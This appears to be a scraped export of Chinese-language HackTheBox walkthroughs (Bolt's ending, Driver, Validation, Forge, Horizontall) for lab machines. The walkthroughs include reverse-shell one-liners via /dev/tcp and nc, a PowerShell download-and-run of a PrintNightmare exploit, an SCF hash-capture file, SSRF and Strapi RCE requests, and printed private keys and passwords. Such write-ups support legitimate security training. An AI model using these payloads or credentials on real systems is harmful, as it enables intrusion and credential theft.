--pinentry-mode loopback --passphrase merrychristmas -d message.asc&#123;&quot;password&quot;:&quot;Z(2rmxsNW(Z?3&#x3D;p&#x2F;9s&quot;,&quot;description&quot;:&quot;&quot;&#125; mail123456Hey Eddie,The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account.Once you&#39;re set up you can start importing your passwords. Please be sure to keep good security in mind - there&#39;s a few things I read about in a security whitepaper that are a little concerning...-Clark Gpg私钥/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log 复制出来调整格式： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364-----BEGIN PGP PRIVATE KEY BLOCK-----Version: OpenPGP.js v4.10.9Comment: https:&#x2F;&#x2F;openpgpjs.orgxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX&#x2F;r1KlhWlTifjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczkcpRETcVDVVMZrLlW4zhA9OXfQY&#x2F;d4&#x2F;OXaAjsU9w+8ne0A5I0aygN2OPnEKhURNa6PCvADh22J5vD+&#x2F;RjPrmpnHcUuj+&#x2F;qtJrS6PyEhY6jgxmeijYZqGkGeWU+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6&#x2F;UhGWZCQ7RKU1jzCbFOvcD98YT9aIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEBAAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicWUjeGmI+w7iQ+WYFlmjFN&#x2F;Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+FhuajS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C&#x2F;Rsyqd0BYXXAiOe++biDBB6v&#x2F;pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9&#x2F;G5FDVjQY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWfDRe3Gtmo&#x2F;npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY&#x2F;r4j+ld8o0YCP+76K&#x2F;7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2AZkM+9snQT9azCX&#x2F;H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49tgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2&#x2F;dET8jmuKs0eHcUct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OPyF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxjXTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K&#x2F;b3eIHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMpeqO3&#x2F;sM0cM8nQSN6YpuGmnYmhGAgV&#x2F;Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CMvjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRpZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZAQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H&#x2F;R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9&#x2F;qXFnyG1k&#x2F;IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnybaqx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH&#x2F;Bj2CvTIdtYD454aDxNbNtzc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd&#x2F;gAOkhU8P2KcDz747WQQR3&#x2F;eQa0m6QhOQY2q&#x2F;VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3FU3vUZKav7ctbWDpJU&#x2F;ZJ++Q&#x2F;bbQxeFPPkM+tZEyAn&#x2F;fHwwYEYDgbYQEIAJpYHMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B&#x2F;Z40fVH29l7ZsWVFHVf7obW5zNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6MKeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FPrOUeNkzYjHVuzsGAKZZzo4BMTh&#x2F;H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8Ko+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7XrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhPleD&#x2F;IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd&#x2F;a3yB4moUKP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS&#x2F;WpaPSEOG3K5lcpt5EneFC64fa6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67JAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFHkERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t&#x2F;Kz99+Ja9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cTGh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlBGquB8QmrJA2QST4v+&#x2F;xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK&#x2F;YSW+nqongcVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXOn0LJKVoiPuZr&#x2F;C0gDkek&#x2F;i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz4sOO1YdK7&#x2F;88KWj2QwlgDoRhj26sqD8GA&#x2F;PtvN0lvInYT93YRqa2e9o7gInT4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8hJ6V&#x2F;kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV&#x2F;WQKJ3duRt1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvSUCUqIkrGQRr7VTk&#x2F;jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGUNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTfQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB&#x2F;9CGuPrOfIaQtuP25S&#x2F;RLVDl8XHvzPmoRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw&#x2F;Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML811Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCmYZFGLdtA&#x2F;qMajW4&#x2F;+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT&#x2F;W0PSwYYWlAywj5&#x3D;cqxZ-----END PGP PRIVATE KEY BLOCK----- root flaggpg解密得到的就是root密码，不能直接ssh，可以su： 参考资料 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2 HTB Bolt [Discussion] | RaidForumshttps://rfmirror.com/Thread-Tutorial-HTB-Bolt-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Driver - HackTheBox","slug":"Driver-HackTheBox","date":"2021-10-05T08:59:49.000Z","updated":"2022-02-28T05:27:14.333Z","comments":true,"path":"2021/10/05/Driver-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/10/05/Driver-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/387 10.10.11.106 端口扫描80和smb端口： 1234567891011121314151617181920212223242526272829303132333435$ nmap -sC -sV 10.10.11.106Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-05 16:26 CSTNmap scan report for 10.10.11.106Host is up (0.34s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-title: Site doesn't have a title (text/html; charset=UTF-8).| http-methods:|_ Potentially risky methods: TRACE135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2021-10-05T15:33:20|_ start_date: 2021-10-05T06:54:58| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required|_clock-skew: mean: 6h59m59s, deviation: 1s, median: 6h59m58s| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 473.46 seconds 80401基础认证： 直接admin:admin进去了： SCF attack固件上传那里提示上传到文件共享，结合前面看到的smb，考虑scf attack： SMB Share – SCF File Attacks – Penetration Testing Labhttps://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ 启动responder，上传scf，得到hash： 123sudo Python ~/Tools/Responder/Responder.py -I utun2 -i 10.10.14.2 -wrf --lm -v[SMB] NTLMv2 Hash : tony::DRIVER:1122334455667788:9C9737B541A64CF6074D8DAA2DCAA4A6:0101000000000000CA97DA58FFB9D701CECD6880AD30A6F100000000020000000000000000000000 hash crack破解出来密码 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txtliltony (tony) @miao.scf12345[Shell]Command&#x3D;2IconFile&#x3D;\\\\10.10.14.2\\miao\\test.ico[Taskbar]Command&#x3D;ToggleDesktop user flag得到的账号密码登录，桌面读取user.txt: 1evil-winrm -i 10.10.11.106 -u tony -p liltony 提权信息进程可以看到spoolsv，前面也看到是和打印机相关，就是最近的PrintNightmare： calebstewart/CVE-2021-1675: Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare)https://github.com/calebstewart/CVE-2021-1675 Playing with PrintNightmare | 0xdf hacks stuffhttps://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html PrintNightmare &amp; root flag利用方式很多，这里是添加一个管理员账号后登录读取root.txt: 1234IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.2:7778/CVE-2021-1675.ps1')Invoke-Nightmare -NewUser \"miao\" -NewPassword \"SuperSecure\"evil-winrm -i 10.10.11.106 -u miao -p SuperSecure 参考资料 SMB Share – SCF File Attacks – Penetration Testing Labhttps://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ calebstewart/CVE-2021-1675: Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare)https://github.com/calebstewart/CVE-2021-1675 Playing with PrintNightmare | 0xdf hacks stuffhttps://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html HTB Driver [Discussion] | RaidForumshttps://rfmirror.com/Thread-Tutorial-HTB-Driver-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Validation - HackTheBox","slug":"Validation-HackTheBox","date":"2021-09-28T05:32:29.000Z","updated":"2021-09-28T05:33:52.110Z","comments":true,"path":"2021/09/28/Validation-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/09/28/Validation-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/382 10.10.11.116 端口扫描22,80,8080: 12345678910111213141516171819202122232425262728293031$ nmap -sC -sV 10.10.11.116Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-27 19:59 CSTNmap scan report for 10.10.11.116Host is up (0.32s latency).Not shown: 987 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)| 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)|_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)80/tcp open http Apache httpd 2.4.48 ((Debian))|_http-title: Site doesn't have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.48 (Debian)119/tcp filtered nntp1113/tcp filtered ltp-deepspace5000/tcp filtered upnp5001/tcp filtered commplex-link5002/tcp filtered rfe5003/tcp filtered filemaker5004/tcp filtered avt-profile-15033/tcp filtered jtnetd-server5280/tcp filtered xmpp-bosh5987/tcp filtered wbem-rmi8080/tcp open http nginx|_http-title: 502 Bad GatewayService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 107.52 seconds 80 二阶SQL注入国家参数那里，注册时正常，查看报错，可能二阶SQL注入： 验证存在： 写文件测试可以写文件： webshell reverse shell &amp; user flag110.10.11.116&#x2F;miao.php?cmd&#x3D;bash -c &#39;exec bash -i %26&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.14&#x2F;4444 &lt;%261&#39; 得到的www shell有权限读取user.txt: 提权 &amp; root flagconfig里全局密码，切到root： 参考资料 HTB: Validation | 0xdf hacks stuffhttps://0xdf.gitlab.io/2021/09/14/htb-validation.html https://www.hackthebox.eu/home/machines/writeup/382 UHC - Validation - YouTubehttps://www.youtube.com/watch?v=UqoVQ4dbYaI&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Forge - HackTheBox","slug":"Forge-HackTheBox","date":"2021-09-14T05:47:52.000Z","updated":"2022-01-24T00:57:31.638Z","comments":true,"path":"2021/09/14/Forge-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/09/14/Forge-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/376 10.10.11.111 端口扫描22,80,和一些filtered端口： 12345678910111213141516171819202122232425$ nmap -sC -sV 10.10.11.111Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-14 13:13 CSTNmap scan report for 10.10.11.111Host is up (0.069s latency).Not shown: 992 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp filtered ftp22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)|_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://forge.htb1036/tcp filtered nsstp1783/tcp filtered unknown2366/tcp filtered qip-login3914/tcp filtered listcrt-port-25510/tcp filtered secureidpropService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 35.39 seconds 80forge.htb加hosts访问： 110.10.11.111 forge.htb 一个图床，上传有两种方式，本地文件和指定url： 子域名子域名扫描发现admin： 123gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -rFound: admin.forge.htb (Status: 200) [Size: 27] admin.forge.htb同样加hosts后访问，提示只允许本地： SSRF注意前面上传图片可以指定URL，那么可以尝试从那里进行SSRF, 支持http和https，有一些过滤，可以大写绕过,访问返回的url得到源码： admin.forge.htb后面就是一步步读取源码： announcements得到ftp账号密码，但ftp不能外部登录，但提示upload接口可以使用?u=参数指定ftp url： 123&lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;&lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt;&lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;lt;url&amp;gt;.&lt;/li&gt; upload &amp; ftp1url&#x3D;http:&#x2F;&#x2F;Admin.Forge.htb&#x2F;upload?u&#x3D;ftp:&#x2F;&#x2F;user:heightofsecurity123!@127.1.1.1&amp;remote&#x3D;1 看起来就是user目录： 同样方式获取ssh私钥： 1url&#x3D;http:&#x2F;&#x2F;Admin.Forge.htb&#x2F;upload?u&#x3D;ftp:&#x2F;&#x2F;user:heightofsecurity123!@127.1.1.1&#x2F;.ssh&#x2F;id_rsa&amp;remote&#x3D;1 user_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW&#x2F;w1WbrG6i6B7Tv2PdQ09NixOmtHR3rnxHouv4&#x2F;l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ&#x2F;6ukr6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3DWJ+u2z&#x2F;VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8GmL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS&#x2F;ZLATTsaH46IE&#x2F;vv9XOJ05qEXRGUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyDK6ui&#x2F;nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH&#x2F;KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5daTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoGK08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts&#x2F;1Tm6dCCChH7IF&#x2F;nFl0FLfESQJyoE1IxgJnzUS&#x2F;ZycaJmB5ckkM9sS+FGF1816&#x2F;Bpi+l9Ppyq0YJWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77&#x2F;VzidOahF0RlM&#x2F;mqZcwxuMFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG&#x2F;RKp1odu&#x2F;Zl7tG+M2IRIPp8gyurov565kWFDmnYAil0e85RJt5oI+IbuHBWrB&#x2F;ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9rrqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQUxW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL&#x2F;p0HwdmD&#x2F;hkAYK6YGfb3Ftkh02AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB&#x2F;DJelObF98yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z&#x2F;wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeuDXfkpfN2GkoA&#x2F;ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4&#x2F;yfLCueQdlCBAAAAwFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUfFDb5B7L+sJai&#x2F;JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM&#x2F;wT3qLk1zmvgNqD51AfvS&#x2F;NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0PfikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j&#x2F;2lNEcCVSI&#x2F;q1vZdEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXrW&#x2F;y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeLwS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAbRVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f&#x2F;xZBKu04Ypad8nH9nlkRdfOuh2jQbnR7k4+Pryk8HqgNS3&#x2F;g1&#x2F;Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2shlLupso7WoS0AAAAKdXNlckBmb3JnZQE&#x3D;-----END OPENSSH PRIVATE KEY----- user flag用户名就是user，ssh登录，得到user.txt： 提权信息一个python脚本，运行后开启一个端口。连接这个端口输入选项，异常时会进入pdb，从而可以执行任意python代码： /opt/remote-manage.py1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening on localhost:&#123;port&#125;') (clientsock, addr) = sock.accept() clientsock.send(b'Enter the secret passsword: ') if clientsock.recv(1024).strip().decode() != 'secretadminpassword': clientsock.send(b'Wrong password!\\n') else: clientsock.send(b'Welcome admin!\\n') while True: clientsock.send(b'\\nWhat do you wanna do: \\n') clientsock.send(b'[1] View processes\\n') clientsock.send(b'[2] View free memory\\n') clientsock.send(b'[3] View listening sockets\\n') clientsock.send(b'[4] Quit\\n') option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput('ps aux').encode()) elif option == 2: clientsock.send(subprocess.getoutput('df').encode()) elif option == 3: clientsock.send(subprocess.getoutput('ss -lnt').encode()) elif option == 4: clientsock.send(b'Bye\\n') breakexcept Exception as e: print(e) pdb.post_mortem(e.__traceback__)finally: quit() 提权 &amp; root flag两个窗口，一个运行server，另一个连接端口触发异常，回到第一个窗口，pdb中执行任意python代码： 1234567sudo /usr/bin/python3 /opt/remote-manage.py(Pdb) import os(Pdb) os.system(\"ls /root\")clean-uploads.sh root.txt snap0(Pdb) os.system(\"cat /root/root.txt\") 参考资料 Hackthebox Forge writeup | 0xDedinfosechttps://0xdedinfosec.github.io/posts/htb-forge/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Horizontall - HackTheBox","slug":"Horizontall-HackTheBox","date":"2021-09-01T06:57:48.000Z","updated":"2022-02-07T04:34:25.930Z","comments":true,"path":"2021/09/01/Horizontall-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/09/01/Horizontall-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/374 10.10.11.105 端口扫描22和80 12345678910111213141516171819$ nmap -sC -sV 10.10.11.105Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-01 14:04 CSTNmap scan report for 10.10.11.105Host is up (0.073s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)| 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)|_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: Did not follow redirect to http://horizontall.htb|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.82 seconds 80需要加hosts： 110.10.11.105 horizontall.htb 子域名需要一个大字典扫描,得到api-prod.horizontall.htb： 123gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u horizontall.htbFound: api-prod.horizontall.htb (Status: 200) [Size: 413] api-prod.horizontall.htb 目录扫描常规目录扫描： 12345678910gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/Admin (Status: 200) [Size: 854]/ADMIN (Status: 200) [Size: 854]/admin (Status: 200) [Size: 854]/favicon.ico (Status: 200) [Size: 1150]/index.html (Status: 200) [Size: 413]/robots.txt (Status: 200) [Size: 121]/reviews (Status: 200) [Size: 507]/users (Status: 403) [Size: 60] adminStrapi: Strapi可以搜到相关漏洞： Exploiting friends with CVE-2019-18818 – thatsn0tmysitehttps://thatsn0tmysite.wordpress.com/2019/11/15/x05/ Strapi Framework Vulnerable to Remote Code Execution (CVE-2019-19609) :: { bit.therapy }https://bittherapy.net/post/strapi-framework-remote-code-execution/ reset password账号简单猜测admin@horizontall.htb，重置密码登录： 123456789curl http://api-prod.horizontall.htb/admin/strapiVersion&#123;\"strapiVersion\":\"3.0.0-beta.17.4\"&#125;python3 strapi.py admin@horizontall.htb http://api-prod.horizontall.htb miaomiao[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4[*] Sending password reset request...[*] Setting new password...[*] Response:b'&#123;\"jwt\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNDc3MDQ3LCJleHAiOjE2MzMwNjkwNDd9.VncxiviJLdAYIYqUOZXNBr6QnwM_8j8qmsPxH6zYl3s\",\"user\":&#123;\"id\":3,\"username\":\"admin\",\"email\":\"admin@horizontall.htb\",\"blocked\":null&#125;&#125;' RCEJWT就是前面重置密码得到的，另外content-length小问题，可以转到burp里修复后重放，getshell： 1curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNDc3MDQ3LCJleHAiOjE2MzMwNjkwNDd9.VncxiviJLdAYIYqUOZXNBr6QnwM_8j8qmsPxH6zYl3s' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'&#123;\\\"plugin\\\":\\\"documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 4444 &gt;/tmp/f)\\\",\\\"port\\\":\\\"1337\\\"&#125;' $'http://api-prod.horizontall.htb/admin/plugins/install' --proxy http://127.0.0.1:8087 写公钥方便后续操作： 1234cd ~mkdir .sshcd .sshecho \"xxxx\" &gt; authorized_keys user flaguser.txt在develpoer目录中，strapi用户有权限读取： 提权信息可以发现本地8000端口，转发查看： 1ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 Laravel，搜到相关漏洞： nth347/CVE-2021-3129_exploit: Exploit for CVE-2021-3129https://github.com/nth347/CVE-2021-3129_exploit 提权 &amp; root 